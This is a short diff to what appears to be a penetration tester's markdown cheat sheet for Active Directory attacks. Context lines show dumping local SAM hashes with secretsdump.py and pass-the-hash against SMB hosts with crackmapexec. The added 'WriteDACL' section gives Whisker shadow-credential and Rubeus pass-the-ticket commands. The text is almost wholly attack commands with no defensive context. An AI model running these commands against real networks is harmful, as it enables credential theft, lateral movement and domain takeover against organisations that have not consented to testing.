@@ -47,3 +47,13 @@ secretsdump.py -sam ./SAM -system ./SYSTEM LOCAL
 ```
 crackmapexec smb sambas.txt  -u wadmin -H aad3b435b51404eeaad3b435b51404ee:<HASH> | grep -a '[+]'
 ```
+
+
+
+### WriteDACL
+```
+.\whisker.exe add /target:<TARGET>$ /domain:<> /dc:<>
+# Copy rubeus command add  `/nowrap`
+# Convert to kirbi file
+./Rubeus.exe ptt /ticket:ticket.kirbi
+```
